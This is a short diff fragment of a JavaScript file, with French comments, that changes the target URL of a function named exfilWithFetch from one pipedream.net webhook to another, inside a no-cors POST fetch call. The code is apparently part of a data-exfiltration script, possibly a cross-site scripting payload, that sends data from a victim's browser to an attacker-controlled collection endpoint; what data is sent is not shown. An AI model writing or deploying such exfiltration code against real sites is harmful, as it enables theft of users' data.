@@ -20,7 +20,7 @@
     
     // Méthode 1: Fetch API
     function exfilWithFetch() {
-        fetch('https://eo7cml45o146x13.m.pipedream.net', {
+        fetch('https://eoepde4unuu7p9q.m.pipedream.net', {
             method: 'POST',
             mode: 'no-cors',
             headers: {
